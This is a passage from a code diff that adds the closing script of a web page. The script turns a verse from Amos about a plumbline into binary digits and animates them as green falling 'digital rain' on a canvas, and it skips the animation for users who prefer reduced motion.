+  var VERSE = "Thus he shewed me: and, behold, the Lord stood upon a wall made by a plumbline, with a plumbline in his hand. And the LORD said unto me, Amos, what seest thou? And I said, A plumbline. Then said the LORD, Behold, I will set a plumbline in the midst of my people Israel: I will not again pass by them any more: ";
+  var BITS = "";
+  for(var i=0;i<VERSE.length;i++){
+    BITS += VERSE.charCodeAt(i).toString(2).padStart(8,'0');
+  }
+
+  var fontSize = 15;
+  var columns, drops, offsets;
+
+  function resize(){
+    canvas.width = window.innerWidth * dpr;
+    canvas.height = window.innerHeight * dpr;
+    canvas.style.width = window.innerWidth + 'px';
+    canvas.style.height = window.innerHeight + 'px';
+    ctx.setTransform(dpr,0,0,dpr,0,0);
+    columns = Math.ceil(window.innerWidth / fontSize);
+    drops = new Array(columns).fill(0).map(function(){ return Math.random() * -50; });
+    offsets = new Array(columns).fill(0).map(function(){ return Math.floor(Math.random()*BITS.length); });
+  }
+  window.addEventListener('resize', resize);
+  resize();
+
+  function draw(){
+    ctx.fillStyle = 'rgba(4,7,10,0.10)';
+    ctx.fillRect(0,0,window.innerWidth, window.innerHeight);
+    ctx.font = fontSize + 'px monospace';
+
+    for(var i=0;i<columns;i++){
+      var bit = BITS[offsets[i] % BITS.length];
+      var y = drops[i] * fontSize;
+      // leading char brighter
+      ctx.fillStyle = '#baffb0';
+      ctx.fillText(bit, i*fontSize, y);
+      ctx.fillStyle = 'rgba(57,255,20,0.55)';
+      ctx.fillText(BITS[(offsets[i]-1+BITS.length) % BITS.length], i*fontSize, y - fontSize);
+
+      offsets[i] = (offsets[i] + 1) % BITS.length;
+      if(y > window.innerHeight && Math.random() > 0.975){
+        drops[i] = 0;
+      }
+      drops[i]++;
+    }
+    requestAnimationFrame(draw);
+  }
+
+  var reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if(!reduce){ requestAnimationFrame(draw); }
+})();
+</script>
+
+</body>
+</html>
